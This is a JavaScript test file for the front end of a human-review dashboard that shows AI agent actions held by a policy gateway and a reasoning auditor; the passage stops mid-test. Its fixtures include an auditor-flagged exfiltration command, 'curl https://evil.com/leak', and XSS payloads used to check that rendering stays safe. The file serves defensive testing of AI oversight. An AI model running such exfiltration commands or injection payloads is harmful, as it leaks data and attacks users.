import test from "node:test";
import assert from "node:assert/strict";
import { STATUS_FACETS } from "../scripts/reviewer-state.js";
import {
  APPROVAL_CONFIRM_COPY,
  STATUS_GLYPHS,
  getStatusGlyph,
  reconcileRunActionStates,
  LEGACY_POLICY_VERSION_LABEL,
  NOT_APPLICABLE_LABEL,
  POLICY_DECISION_EVENT_TYPES,
  PROVENANCE_LABELS,
  REVIEWER_ACCESS_COPY,
  actionRequestStore,
  approvalConfirmStep,
  approvalStore,
  auditStore,
  authFailureHint,
  clearStores,
  buildStaticSimulationEvent,
  formatApprovalCardData,
  resolveSubmissionTarget,
  getHoldIcon,
  getHoldKind,
  getProvenanceLabel,
  getSseBannerCopy,
  groupEventsByTurn,
  isLiveRequested,
  panelStatus,
  policyVersionLabelFor,
  renderHighlightedText,
  renderPanelStatus,
  reviewerAccessState,
  safeTransformApiEvent,
  shouldShowPolicyVersion,
  transformApiEvent,
} from "../scripts/app.js";

// Minimal DOM shim for Node.js unit test execution
if (typeof globalThis.document === "undefined") {
  globalThis.document = {
    createTextNode(text) {
      return {
        nodeType: 3,
        tagName: undefined,
        textContent: String(text),
      };
    },
    createElement(tagName) {
      return {
        nodeType: 1,
        tagName: tagName.toUpperCase(),
        className: "",
        textContent: "",
      };
    },
  };
}

function createContainer() {
  const children = [];
  return {
    children,
    replaceChildren(...nodes) {
      children.length = 0;
      children.push(...nodes);
    },
    append(...nodes) {
      children.push(...nodes);
    },
    get textContent() {
      return children.map((c) => c.textContent).join("");
    },
    querySelectorAll(sel) {
      return children.filter((c) => {
        if (sel === "mark" || sel === "mark.highlight-excerpt") {
          return c.tagName === "MARK";
        }
        if (sel === "script") return c.tagName === "SCRIPT";
        if (sel === "img") return c.tagName === "IMG";
        return false;
      });
    },
  };
}

test("provenance label mapping maps all provenance types accurately", () => {
  assert.equal(getProvenanceLabel("PROVIDER_EXPOSED_TRACE"), "Provider-exposed trace");
  assert.equal(getProvenanceLabel("AGENT_AUTHORED_SUMMARY"), "Agent-authored summary");
  assert.equal(getProvenanceLabel("UNAVAILABLE"), "Unavailable");
  assert.equal(getProvenanceLabel("SYNTHETIC_FIXTURE"), "Synthetic fixture");
  // Unverified caller assertions never read as a verified provider trace (#116).
  assert.equal(
    getProvenanceLabel("CALLER_ASSERTED_PROVIDER_TRACE"),
    "Caller-asserted trace (unverified)",
  );
  assert.equal(
    getProvenanceLabel("CALLER_ASSERTED_SUMMARY"),
    "Caller-asserted summary (unverified)",
  );

  // Fallbacks & edge cases
  assert.equal(getProvenanceLabel(null), "Unavailable");
  assert.equal(getProvenanceLabel(""), "Unavailable");
  assert.equal(getProvenanceLabel("unknown_type"), "unknown_type");
});

test("transformApiEvent maps every provenance value correctly", () => {
  const baseEvent = {
    id: "ev-1",
    sequence: 1,
    event_type: "ACTION_REQUESTED",
    summary: "Test action",
  };

  // 1. Explicit PROVIDER_EXPOSED_TRACE
  const resProvider = transformApiEvent({
    ...baseEvent,
    details: {
      tool: "workspace",
      exposed_reasoning_trace: "Thinking about step 1...",
      reasoning_provenance: "PROVIDER_EXPOSED_TRACE",
    },
  });
  assert.equal(resProvider.reasoningProvenance, "PROVIDER_EXPOSED_TRACE");
  assert.equal(resProvider.reasoning_provenance, "PROVIDER_EXPOSED_TRACE");
  assert.equal(resProvider.exposedReasoningTrace, "Thinking about step 1...");
  assert.equal(resProvider.reasoningTrace, "Thinking about step 1...");

  // 2. Explicit AGENT_AUTHORED_SUMMARY
  const resSummary = transformApiEvent({
    ...baseEvent,
    details: {
      tool: "workspace",
      reasoning_summary: "Agent summarized step 1.",
      reasoning_provenance: "AGENT_AUTHORED_SUMMARY",
    },
  });
  assert.equal(resSummary.reasoningProvenance, "AGENT_AUTHORED_SUMMARY");
  assert.equal(resSummary.reasoning_provenance, "AGENT_AUTHORED_SUMMARY");
  assert.equal(resSummary.reasoningSummary, "Agent summarized step 1.");
  assert.match(resSummary.reasoningTrace, /Unavailable/);

  // 3. Explicit UNAVAILABLE
  const resUnavail = transformApiEvent({
    ...baseEvent,
    details: {
      tool: "workspace",
      reasoning_provenance: "UNAVAILABLE",
    },
  });
  assert.equal(resUnavail.reasoningProvenance, "UNAVAILABLE");
  assert.equal(resUnavail.reasoning_provenance, "UNAVAILABLE");

  // 4. SYNTHETIC_FIXTURE
  const resFixture = transformApiEvent({
    id: "inv-01",
    sequence: 1,
    event_type: "ACTION_REQUESTED",
    details: { tool: "workspace" },
  });
  assert.equal(resFixture.reasoningProvenance, "SYNTHETIC_FIXTURE");

  // 5. CALLER_ASSERTED_PROVIDER_TRACE passes through with its own label (#116)
  const resCallerTrace = transformApiEvent({
    ...baseEvent,
    details: {
      tool: "workspace",
      exposed_reasoning_trace: "text a caller asserted",
      reasoning_provenance: "CALLER_ASSERTED_PROVIDER_TRACE",
      caller_claimed_provenance: "PROVIDER_EXPOSED_TRACE",
    },
  });
  assert.equal(resCallerTrace.reasoningProvenance, "CALLER_ASSERTED_PROVIDER_TRACE");
  assert.equal(
    getProvenanceLabel(resCallerTrace.reasoningProvenance),
    "Caller-asserted trace (unverified)",
  );
});

test("transformApiEvent never infers a verified trace label from trace text alone (#116)", () => {
  // An event with reasoning text but no stored provenance means the gateway
  // never recorded a verified capture, so the UI must not imply one.
  const inferred = transformApiEvent({
    id: "ev-2",
    sequence: 2,
    event_type: "ACTION_REQUESTED",
    details: { tool: "workspace", exposed_reasoning_trace: "some text" },
  });
  assert.equal(inferred.reasoningProvenance, "CALLER_ASSERTED_PROVIDER_TRACE");

  const inferredSummary = transformApiEvent({
    id: "ev-3",
    sequence: 3,
    event_type: "ACTION_REQUESTED",
    details: { tool: "workspace", reasoning_summary: "some summary" },
  });
  assert.equal(inferredSummary.reasoningProvenance, "CALLER_ASSERTED_SUMMARY");
});

test("transformApiEvent maps every audit verdict correctly", () => {
  const baseEvent = {
    id: "ev-audit-test",
    sequence: 2,
    event_type: "POLICY_ALLOWED",
  };

  // 1. NO_CONCERN
  const resNoConcern = transformApiEvent({
    ...baseEvent,
    details: {
      reason_code: "ALLOW",
      reasoning_audit: {
        verdict: "NO_CONCERN",
        concern_type: null,
        flagged_excerpts: [],
        explanation: "All steps within authorized scope.",
        model: "nemotron-audit-v1",
        profile: "strict",
      },
    },
  });
  assert.ok(resNoConcern.reasoningAudit);
  assert.equal(resNoConcern.reasoningAudit.verdict, "NO_CONCERN");
  assert.equal(resNoConcern.reasoningAudit.concern_type, null);
  assert.deepEqual(resNoConcern.reasoningAudit.flagged_excerpts, []);
  assert.equal(resNoConcern.reasoningAudit.model, "nemotron-audit-v1");
  assert.equal(resNoConcern.reasoningAudit.profile, "strict");
  assert.equal(resNoConcern.reasoningAudit.explanation, "All steps within authorized scope.");

  // 2. CONCERN
  const resConcern = transformApiEvent({
    ...baseEvent,
    details: {
      reason_code: "REASONING_SCOPE_CONCERN",
      reasoning_audit: {
        verdict: "CONCERN",
        concern_type: "EXFILTRATION_INTENT",
        flagged_excerpts: ["curl https://evil.com/leak"],
        explanation: "Agent attempted outbound exfiltration.",
        model: "nemotron-audit-v1",
        profile: "strict",
      },
    },
  });
  assert.ok(resConcern.reasoningAudit);
  assert.equal(resConcern.reasoningAudit.verdict, "CONCERN");
  assert.equal(resConcern.reasoningAudit.concern_type, "EXFILTRATION_INTENT");
  assert.deepEqual(resConcern.reasoningAudit.flagged_excerpts, ["curl https://evil.com/leak"]);

  // 3. FAILED
  const resFailed = transformApiEvent({
    ...baseEvent,
    event_type: "REASONING_AUDIT_FAILED",
    details: {
      reason_code: "REASONING_AUDIT_FAILED",
      verdict: "FAILED",
      explanation: "Auditor response timed out.",
      flagged_excerpts: [],
      model: "mock-auditor",
      profile: "default",
    },
  });
  assert.ok(resFailed.reasoningAudit);
  assert.equal(resFailed.reasoningAudit.verdict, "FAILED");
  assert.equal(resFailed.reasoningAudit.explanation, "Auditor response timed out.");
});

test("transformApiEvent distinguishes all three hold types via text badge and reason code", () => {
  // 1. Policy hold
  const evPolicy = transformApiEvent({
    id: "ev-hold-1",
    sequence: 3,
    event_type: "POLICY_HELD",
    details: { reason_code: "APPROVAL_REQUIRED" },
  });
  assert.equal(evPolicy.status, "held");
  assert.equal(evPolicy.statusLabel, "HOLD (policy)");
  assert.equal(evPolicy.reasonCode, "APPROVAL_REQUIRED");

  // 2. Reasoning scope concern hold
  const evConcern = transformApiEvent({
    id: "ev-hold-2",
    sequence: 4,
    event_type: "POLICY_HELD",
    details: { reason_code: "REASONING_SCOPE_CONCERN" },
  });
  assert.equal(evConcern.status, "held");
  assert.equal(evConcern.statusLabel, "HOLD (reasoning concern)");
  assert.equal(evConcern.reasonCode, "REASONING_SCOPE_CONCERN");

  // 3. Reasoning audit failed hold
  const evAuditFailed = transformApiEvent({
    id: "ev-hold-3",
    sequence: 5,
    event_type: "POLICY_HELD",
    details: { reason_code: "REASONING_AUDIT_FAILED" },
  });
  assert.equal(evAuditFailed.status, "held");
  assert.equal(evAuditFailed.statusLabel, "HOLD (audit failed)");
  assert.equal(evAuditFailed.reasonCode, "REASONING_AUDIT_FAILED");
});

test("transformApiEvent extracts turn_id properly", () => {
  const evTurn = transformApiEvent({
    id: "ev-turn-1",
    sequence: 6,
    turn_id: "turn-42",
    event_type: "ACTION_REQUESTED",
    details: { tool: "workspace" },
  });
  assert.equal(evTurn.turnId, "turn-42");
  assert.equal(evTurn.turn_id, "turn-42");
});

test("renderHighlightedText highlights matched excerpts without innerHTML", () => {
  const container = createContainer();
  const text = "I will read invoices and then exfiltrate data to an external server.";
  const excerpts = ["exfiltrate data to an external server"];

  renderHighlightedText(container, text, excerpts);

  assert.equal(container.textContent, text);
  const marks = container.querySelectorAll("mark");
  assert.equal(marks.length, 1);
  assert.equal(marks[0].textContent, "exfiltrate data to an external server");
  assert.equal(marks[0].className, "highlight-excerpt");
});

test("renderHighlightedText safely merges overlapping or duplicate excerpts", () => {
  const container = createContainer();
  const text = "Alpha beta gamma delta epsilon";
  // Overlapping intervals: "beta gamma" and "gamma delta"
  const excerpts = ["beta gamma", "gamma delta"];

  renderHighlightedText(container, text, excerpts);

  assert.equal(container.textContent, text);
  const marks = container.querySelectorAll("mark");
  assert.equal(marks.length, 1);
  assert.equal(marks[0].textContent, "beta gamma delta");
});

test("renderHighlightedText is completely XSS-resilient with script and HTML tags", () => {
  const container = createContainer();
  const xssPayload = "<script>alert(1)</script><img src=x onerror=alert(2)>";
  const excerpts = ["alert(1)", "onerror=alert(2)"];

  renderHighlightedText(container, xssPayload, excerpts);

  // Exact string preservation
  assert.equal(container.textContent, xssPayload);

  // Ensure NO actual script or img elements were ever created
  assert.equal(container.querySelectorAll("script").length, 0);
  assert.equal(container.querySelectorAll("img").length, 0);

  // Only safe MARK tags and Text nodes
  const marks = container.querySelectorAll("mark");
  assert.equal(marks.length, 2);
  assert.equal(marks[0].textContent, "alert(1)");
  assert.equal(marks[1].textContent, "onerror=alert(2)");
});

test("safeTransformApiEvent never throws and skips malformed frames with a warning", () => {
  const warnings = [];
  const origWarn = console.warn;
  console.warn = (...args) => warnings.push(args.join(" "));
  try {
    assert.equal(safeTransformApiEvent(null), null);
    assert.equal(safeTransformApiEvent(undefined), null);
    assert.equal(safeTransformApiEvent("garbage"), null);
    assert.equal(safeTransformApiEvent(42), null);
    assert.equal(safeTransformApiEvent({}), null, "frame without id/sequence is skipped");
    assert.equal(safeTransformApiEvent({ id: "no-seq" }), null);
  } finally {
    console.warn = origWarn;
  }
  assert.equal(warnings.length, 6);
  assert.ok(warnings.every((w) => /skipping/.test(w)));
});

test("safeTransformApiEvent passes valid frames through unchanged", () => {
  const raw = {
    id: "ev-good",
    sequence: 11,
    event_type: "POLICY_HELD",
    details: { reason_code: "APPROVAL_REQUIRED", tool: "workspace", operation: "delete_path" },
  };
  const viaSafe = safeTransformApiEvent(raw);
  const viaDirect = transformApiEvent({ ...raw, details: { ...raw.details } });
  assert.deepEqual(viaSafe, viaDirect);
  assert.equal(viaSafe.status, "held");
});

test("hold kinds carry distinct icons plus text (never colour alone)", () => {
  assert.equal(getHoldKind({ status: "pending-approval", reasonCode: "APPROVAL_REQUIRED" }), "policy");
  assert.equal(getHoldKind({ status: "pending-approval", reasonCode: "REASONING_SCOPE_CONCERN" }), "concern");
  assert.equal(getHoldKind({ status: "pending-approval", reasonCode: "REASONING_AUDIT_FAILED" }), "failed");
  assert.equal(getHoldKind({ status: "executed" }), null);
  assert.equal(getHoldKind(null), null);
  const icons = new Set([getHoldIcon("policy"), getHoldIcon("concern"), getHoldIcon("failed")]);
  assert.equal(icons.size, 3, "each hold kind needs its own icon glyph");
  for (const icon of icons) {
    assert.ok(icon.length > 0, "icon glyph must be non-empty text");
  }
  assert.equal(getHoldIcon("unknown"), "");
});

test("approval double-confirm arms first, fires on second, blocks while pending", () => {
  assert.deepEqual(approvalConfirmStep("idle", "approve"), { next: "armed-approve", fire: null });
  assert.deepEqual(approvalConfirmStep("idle", "deny"), { next: "armed-deny", fire: null });
  assert.deepEqual(approvalConfirmStep("armed-approve", "approve"), { next: "pending", fire: "approve" });
  assert.deepEqual(approvalConfirmStep("armed-deny", "deny"), { next: "pending", fire: "deny" });
  // Switching target re-arms instead of firing
  assert.deepEqual(approvalConfirmStep("armed-approve", "deny"), { next: "armed-deny", fire: null });
  assert.deepEqual(approvalConfirmStep("armed-deny", "approve"), { next: "armed-approve", fire: null });
  // Pending actions are single-use: further clicks are ignored
  assert.deepEqual(approvalConfirmStep("pending", "approve"), { next: "pending", fire: null });
  assert.deepEqual(approvalConfirmStep("pending", "deny"), { next: "pending", fire: null });
  // Reset disarms without firing
  assert.deepEqual(approvalConfirmStep("armed-approve", "reset"), { next: "idle", fire: null });
  // Confirm button copy is explicit text, not colour alone
  assert.match(APPROVAL_CONFIRM_COPY.confirmApprove, /Confirm approve/);
  assert.match(APPROVAL_CONFIRM_COPY.confirmDeny, /Confirm deny/);
});

test("panelStatus maps loading/error/empty/ready with explicit copy", () => {
  const copy = { loadingText: "Loading runs…", errorText: "Could not load runs.", emptyText: "No runs available." };
  assert.deepEqual(panelStatus({ loading: true }, copy), { kind: "loading", text: "Loading runs…" });
  // Loading wins over error/empty so spinners never flicker into errors
  assert.deepEqual(panelStatus({ loading: true, error: new Error("x"), count: 0 }, copy).kind, "loading");
  const errStatus = panelStatus({ error: new Error("boom") }, copy);
  assert.equal(errStatus.kind, "error");
  assert.match(errStatus.text, /Could not load runs\./);
  assert.match(errStatus.text, /boom/);
  assert.deepEqual(panelStatus({ count: 0 }, copy), { kind: "empty", text: "No runs available." });
  assert.deepEqual(panelStatus({ count: 3 }, copy), { kind: "ready", text: "" });
});

test("renderPanelStatus toggles the region without innerHTML", () => {
  const region = { hidden: true, textContent: "" };
  assert.equal(renderPanelStatus(region, { kind: "loading", text: "Loading…" }), "loading");
  assert.equal(region.hidden, false);
  assert.equal(region.textContent, "Loading…");
  assert.equal(renderPanelStatus(region, { kind: "ready", text: "" }), "ready");
  assert.equal(region.hidden, true);
});

test("SSE banner copy is visible text with a glyph for reconnecting/stale/polling", () => {
  const recon = getSseBannerCopy("reconnecting", "Reconnecting live stream (attempt 2, retry in 4s)...");
  assert.equal(recon.visible, true);
  assert.ok(recon.glyph.length > 0);
  assert.match(recon.text, /attempt 2/);
  const stale = getSseBannerCopy("stale", "No live frames for 45s. Showing last known state.");
  assert.equal(stale.visible, true);
  assert.match(stale.text, /last known state/);
  const polling = getSseBannerCopy("polling", "Live stream unavailable. Polling for updates.");
  assert.equal(polling.visible, true);
  assert.equal(getSseBannerCopy("connected").visible, false);
  assert.equal(getSseBannerCopy("disconnected").visible, false);
});

test("transformApiEvent keeps attacker-controlled strings as inert data", () => {
  const payload = '<script>alert(1)</script><img src=x onerror=alert(2)>';
  const res = transformApiEvent({
    id: "ev-xss",
    sequence: 99,
    event_type: "ACTION_REQUESTED",
    details: {
      tool: payload,
      operation: payload,
      resource: payload,
      reasoning_summary: payload,
      exposed_reasoning_trace: payload,
    },
  });
  // Verbatim preservation as strings: safe for textContent rendering downstream
  assert.equal(res.tool, payload);
  assert.equal(res.operation, payload);
  assert.equal(res.resource, payload);
  assert.equal(res.reasoningSummary, payload);
  assert.equal(res.exposedReasoningTrace, payload);
  assert.equal(typeof res.title, "string");
});

test("groupEventsByTurn handles empty and snake_case turn ids", () => {
  assert.deepEqual(groupEventsByTurn([]), []);
  assert.deepEqual(groupEventsByTurn(null), []);
  const groups = groupEventsByTurn([
    { id: "a", turn_id: "t-1" },
    { id: "b", turnId: "t-1" },
    { id: "c" },
  ]);
  assert.equal(groups.length, 2);
  assert.equal(groups[0].turnId, "t-1");
  assert.deepEqual(groups[0].events.map((e) => e.id), ["a", "b"]);
  assert.equal(groups[1].turnId, null);
});

test("isLiveRequested: explicit live=0 means static even on the gateway port (#132)", () => {
  assert.equal(isLiveRequested("?live=0", "8000"), false);
  assert.equal(isLiveRequested("?live=0", "8765"), false);
  assert.equal(isLiveRequested("?live=false"), false);
  assert.equal(isLiveRequested("?live=OFF"), false);
  assert.equal(isLiveRequested("?live=no"), false);
});

test("isLiveRequested: live=1 or a bare live parameter means live on any port", () => {
  assert.equal(isLiveRequested("?live=1", "9000"), true);
  assert.equal(isLiveRequested("?live", "9000"), true);
  assert.equal(isLiveRequested("?live=true", ""), true);
});

test("isLiveRequested: without a live parameter, the default port or flag decides", () => {
  assert.equal(isLiveRequested("", "8000"), true);
  assert.equal(isLiveRequested("", "8765"), false);
  assert.equal(isLiveRequested("", "8765", true), true);
  assert.equal(isLiveRequested("?other=live", "8765"), false);
});

test("transformApiEvent joins approval record and surfaces simulated execution markers (#134)", () => {
  const actionId = "act-del-134";
  const turnId = "turn-del-134";

  // 1. Policy holds action
  const held = transformApiEvent({
    id: "ev-hold-134",
    sequence: 1,
    event_type: "POLICY_HELD",
    action_request_id: actionId,
    turn_id: turnId,
    details: {
      operation: "delete_path",
      resource: "outputs/archive_2025.txt",
      reason_code: "APPROVAL_REQUIRED",
    },
  });
  assert.equal(held.status, "held");
  assert.equal(held.approvalStatus, "Pending reviewer authorization");

  // 2. Reviewer approves
  const granted = transformApiEvent({
    id: "ev-appr-134",
    sequence: 2,
    event_type: "APPROVAL_GRANTED",
    action_request_id: actionId,
    turn_id: turnId,
    actor: "security-reviewer",
    details: {
      reason: "Approved deletion of stale archive",
      approval_request_id: "appr-134",
    },
  });
  assert.equal(granted.approvalStatus, "Approved");
  assert.equal(granted.resolvedBy, "security-reviewer");
  assert.equal(granted.resolutionReason, "Approved deletion of stale archive");

  // 3. Execution event arrives (EXECUTION_SUCCEEDED with simulated receipt)
  const exec = transformApiEvent({
    id: "ev-exec-134",
    sequence: 3,
    event_type: "EXECUTION_SUCCEEDED",
    action_request_id: actionId,
    turn_id: turnId,
    actor: "synthetic-workspace-executor",
    summary: "Successfully executed approved delete_path on 'outputs/archive_2025.txt'.",
    details: {
      status: "EXECUTED",
      result: {
        operation: "delete_path",
        resource: "outputs/archive_2025.txt",
        simulated: true,
        note: "Deletion simulated safely in baseline demo; target not unlinked.",
      },
    },
  });

  // Verify approval join: execution event preserves who approved it
  assert.equal(exec.approvalStatus, "Approved");
  assert.equal(exec.resolvedBy, "security-reviewer");
  assert.equal(exec.resolutionReason, "Approved deletion of stale archive");

  // Verify simulated marker extraction
  assert.equal(exec.executionSimulated, true);
  assert.equal(exec.execution_simulated, true);
  assert.equal(exec.executionNote, "Deletion simulated safely in baseline demo; target not unlinked.");
  assert.equal(
    exec.resultPreview,
    "[Simulated] Deletion simulated safely in baseline demo; target not unlinked."
  );
});

test("transformApiEvent surfaces simulated marker on unheld simulated execution (#134)", () => {
  const exec = transformApiEvent({
    id: "ev-sim-direct",
    sequence: 1,
    event_type: "EXECUTION_SUCCEEDED",
    details: {
      status: "EXECUTED",
      result: {
        simulated: true,
        note: "Direct simulated write.",
      },
    },
  });
  assert.equal(exec.executionSimulated, true);
  assert.equal(exec.executionNote, "Direct simulated write.");
  assert.equal(exec.resultPreview, "[Simulated] Direct simulated write.");
  assert.equal(exec.approvalStatus, null);
});

test("transformApiEvent retains unapproved status on normal allow (#134)", () => {
  const exec = transformApiEvent({
    id: "ev-allow-normal",
    sequence: 1,
    event_type: "EXECUTION_SUCCEEDED",
    action_request_id: "act-normal-134",
    details: {
      status: "EXECUTED",
      result: { preview: "File content read cleanly." },
    },
  });
  assert.equal(exec.executionSimulated, false);
  assert.equal(exec.approvalStatus, null);
  assert.equal(exec.resultPreview, "File content read cleanly.");
});

test("transformApiEvent and UI render explicit unaudited and disabled reasoning states (#127)", () => {
  const baseEvent = {
    id: "ev-unaudited-test",
    sequence: 1,
    event_type: "POLICY_ALLOWED",
  };

  // 1. Unavailable reasoning trace & audit
  const resUnavailable = transformApiEvent({
    ...baseEvent,
    details: {
      reason_code: "ALLOW",
      reasoning_audit: "unavailable",
      reasoning_availability: "unavailable",
      reasoning_provenance: "UNAVAILABLE",
    },
  });
  assert.equal(resUnavailable.reasoningAudit, null);
  assert.equal(resUnavailable.reasoningAuditStatus, "unavailable");

  // 2. Disabled reasoning audit
  const resDisabled = transformApiEvent({
    ...baseEvent,
    details: {
      reason_code: "ALLOW",
      reasoning_audit: "disabled",
      reasoning_availability: "disabled",
    },
  });
  assert.equal(resDisabled.reasoningAudit, null);
  assert.equal(resDisabled.reasoningAuditStatus, "disabled");

  // 3. Fully audited action has status audited
  const resAudited = transformApiEvent({
    ...baseEvent,
    details: {
      reason_code: "ALLOW",
      reasoning_audit: {
        verdict: "NO_CONCERN",
        explanation: "OK",
      },
    },
  });
  assert.ok(resAudited.reasoningAudit);
  assert.equal(resAudited.reasoningAuditStatus, "audited");
});

// ---------------------------------------------------------------------------
// Issue #119: evaluated policy identity in the reviewer UI
// ---------------------------------------------------------------------------

const POLICY_V = "2026-10-03.1+3f2a1b9c8d0e";

function _policyEvent(event_type, details) {
  return {
    id: `ev-${event_type}-${Math.random().toString(16).slice(2)}`,
    sequence: 1,
    run_id: "run-119",
    event_type,
    timestamp: "2026-10-03T00:00:00+00:00",
    actor: "deterministic-policy",
    summary: `synthetic ${event_type}`,
    action_request_id: "action-119",
    policy_decision_id: "decision-119",
    details: details || {},
  };
}

test("decision events surface the stored policy version verbatim (#119)", () => {
  for (const type of ["POLICY_ALLOWED", "POLICY_HELD", "POLICY_DENIED"]) {
    const res = transformApiEvent(
      _policyEvent(type, { outcome: "ALLOW", reason_code: "ALLOWED_TOOL_AND_RESOURCE", policy_version: POLICY_V }),
    );
    assert.equal(res.policyVersion, POLICY_V, `${type} must expose the stored version`);
    assert.equal(res.policyVersionLabel, POLICY_V);
    assert.equal(res.eventType, type);
  }
});

test("pre-version decision events read as unknown, never as a deployed revision (#119)", () => {
  for (const type of POLICY_DECISION_EVENT_TYPES) {
    const res = transformApiEvent(_policyEvent(type, { reason_code: "APPROVAL_REQUIRED" }));
    assert.equal(res.policyVersion, null, `${type} must not invent a version`);
    assert.equal(res.policyVersionLabel, LEGACY_POLICY_VERSION_LABEL);
    assert.equal(shouldShowPolicyVersion(res.eventType, res.policyVersion), true);
  }
  // A blank or whitespace value is treated as missing, not as a version.
  const blank = transformApiEvent(_policyEvent("POLICY_HELD", { policy_version: "   " }));
  assert.equal(blank.policyVersion, null);
  assert.equal(blank.policyVersionLabel, LEGACY_POLICY_VERSION_LABEL);
});

test("events with no policy identity of their own show no version (#119)", () => {
  for (const type of ["ACTION_REQUESTED", "RUN_CREATED", "EXECUTION_SUCCEEDED"]) {
    const res = transformApiEvent(_policyEvent(type, { operation: "read_text" }));
    assert.equal(res.policyVersion, null);
    assert.equal(res.policyVersionLabel, NOT_APPLICABLE_LABEL);
    assert.equal(shouldShowPolicyVersion(res.eventType, res.policyVersion), false);
  }
});

test("policyVersionLabelFor and shouldShowPolicyVersion agree on every case (#119)", () => {
  const cases = [
    ["POLICY_ALLOWED", POLICY_V],
    ["POLICY_ALLOWED", null],
    ["POLICY_DENIED", ""],
    ["APPROVAL_GRANTED", null],
    ["EXECUTION_STARTED", null],
    ["EXECUTION_STARTED", POLICY_V],
    [undefined, undefined],
  ];
  for (const [type, version] of cases) {
    const label = policyVersionLabelFor(type, version);
    const shown = shouldShowPolicyVersion(type, version);
    if (shown) {
      assert.equal(label, version || LEGACY_POLICY_VERSION_LABEL);
      assert.notEqual(label, NOT_APPLICABLE_LABEL);
    } else {
      assert.equal(label, NOT_APPLICABLE_LABEL);
    }
  }
});

test("approval events expose the evaluated version and any recorded drift (#119)", () => {
  const stable = transformApiEvent(
    _policyEvent("APPROVAL_GRANTED", { policy_version: POLICY_V, reason: "ok" }),
  );
  assert.equal(stable.policyVersion, POLICY_V);
  assert.equal(stable.policyVersionChanged, false);
  assert.equal(stable.policyVersionCurrent, null);

  const drifted = transformApiEvent(
    _policyEvent("APPROVAL_GRANTED", {
      policy_version: "2026-01-01.1+aaaabbbbcccc",
      policy_version_current: "2026-02-01.1+ddddeeeeffff",
      policy_version_changed: true,
      reason: "ok",
    }),
  );
  assert.equal(drifted.policyVersion, "2026-01-01.1+aaaabbbbcccc");
  assert.equal(drifted.policyVersionCurrent, "2026-02-01.1+ddddeeeeffff");
  assert.equal(drifted.policyVersionChanged, true);
});

test("policy version is read from details, then a top-level field (#119)", () => {
  const inDetails = transformApiEvent(_policyEvent("POLICY_HELD", { policy_version: POLICY_V }));
  assert.equal(inDetails.policyVersion, POLICY_V);

  const topLevel = transformApiEvent({
    ..._policyEvent("POLICY_HELD", {}),
    policy_version: POLICY_V,
  });
  assert.equal(topLevel.policyVersion, POLICY_V);

  // Details win over a stale top-level copy.
  const both = transformApiEvent({
    ..._policyEvent("POLICY_HELD", { policy_version: POLICY_V }),
    policy_version: "1999-01-01.1+000000000000",
  });
  assert.equal(both.policyVersion, POLICY_V);
});

test("an attacker-controlled version stays inert data (#119)", () => {
  const res = transformApiEvent(
    _policyEvent("POLICY_ALLOWED", { policy_version: "<img src=x onerror=alert(1)>" }),
  );
  assert.equal(typeof res.policyVersion, "string");
  assert.equal(res.policyVersionLabel, "<img src=x onerror=alert(1)>");
});

test("reviewer access state reports the credential without revealing it (#115)", () => {
  assert.equal(reviewerAccessState(false), REVIEWER_ACCESS_COPY.noToken);
  assert.equal(reviewerAccessState(true), REVIEWER_ACCESS_COPY.tokenSet);
  // The state line must say which mutation classes are affected, and must not
  // read as if reads were blocked.
  assert.match(REVIEWER_ACCESS_COPY.noToken, /mutating actions are refused/i);
  assert.match(REVIEWER_ACCESS_COPY.noToken, /[Rr]eading runs, events, and evidence still works/);
  assert.match(REVIEWER_ACCESS_COPY.tokenSet, /in memory for this page only/i);
});

test("authFailureHint points a refused mutation at the reviewer token panel (#115)", () => {
  const denied = new Error("Demo access token required.");
  denied.status = 401;
  const hint = authFailureHint(denied);
  assert.match(hint, /Reviewer access/);
  assert.match(hint, /reviewer token/i);

  // Gate misconfiguration (503) is the other auth-shaped refusal.
  const misconfigured = new Error("Demo access is not configured on this host.");
  misconfigured.status = 503;
  assert.match(authFailureHint(misconfigured), /Reviewer access/);

  // Ordinary failures keep their original copy: no auth speculation.
  const other = new Error("Gateway is temporarily unreachable.");
  other.status = 502;
  assert.equal(authFailureHint(other), "");
  assert.equal(authFailureHint(null), "");

  // The hint never restates or leaks a token value.
  const withTokenText = new Error("Demo access token required.");
  withTokenText.status = 401;
  assert.ok(!authFailureHint(withTokenText).includes("judge-token"));
});

// ---------------------------------------------------------------------------
// Issue #209: Honest simulation labelling & live-mode isolation
// ---------------------------------------------------------------------------

test("buildStaticSimulationEvent labels every preview output as simulated (#209)", () => {
  const dummyRun = { id: "run-fixture-1", events: [] };

  // 1. Escalated hold preset
  const holdEsc = buildStaticSimulationEvent(
    dummyRun,
    {
      tool: "workspace",
      operation: "read_text",
      resource: "invoices/approved/vendor-a.txt",
      reasoning_summary: "summary",
      exposed_reasoning_trace: "steal and exfiltrate data",
    },
    {},
    true,
    false,
    "sim-1",
    1,
  );
  assert.match(holdEsc.statusMessage, /Simulated in browser — no gateway or auditor/);
  assert.match(holdEsc.event.title, /Simulated in browser — no gateway or auditor/);
  assert.match(holdEsc.event.statusDescription, /Simulated in browser — no gateway or auditor/);
  assert.match(holdEsc.event.policyExplanation, /Simulated in browser — no gateway or auditor/);
  assert.match(holdEsc.event.execution, /Simulated in browser — no gateway or auditor/);
  assert.equal(holdEsc.event.statusLabel, "HOLD (reasoning concern)");
  assert.notEqual(holdEsc.event.reasoningAudit.profile, "nemotron-cot-auditor-v1");
  assert.match(holdEsc.event.reasoningAudit.explanation, /Simulated in browser — no gateway or auditor/);
  assert.match(holdEsc.approval.operation, /\(Simulated/);

  // 2. Approval required preset
  const holdAppr = buildStaticSimulationEvent(
    dummyRun,
    {
      tool: "workspace",
      operation: "delete_path",
      resource: "outputs/old.txt",
      reasoning_summary: "summary",
      exposed_reasoning_trace: "",
    },
    {},
    false,
    true,
    "sim-2",
    2,
  );
  assert.match(holdAppr.statusMessage, /Simulated in browser — no gateway or auditor/);
  assert.match(holdAppr.event.title, /Simulated in browser — no gateway or auditor/);
  assert.match(holdAppr.event.statusDescription, /Simulated in browser — no gateway or auditor/);
  assert.match(holdAppr.event.policyExplanation, /Simulated in browser — no gateway or auditor/);
  assert.match(holdAppr.event.execution, /Simulated in browser — no gateway or auditor/);
  assert.equal(holdAppr.event.statusLabel, "HOLD (policy)");
  assert.equal(holdAppr.event.reasoningAudit, null);
  assert.match(holdAppr.approval.operation, /\(Simulated/);

  // 3. Default allowed action
  const allowSim = buildStaticSimulationEvent(
    dummyRun,
    {
      tool: "workspace",
      operation: "read_text",
      resource: "invoices/approved/vendor-a.txt",
      reasoning_summary: "summary",
      exposed_reasoning_trace: "",
    },
    {},
    false,
    false,
    "sim-3",
    3,
  );
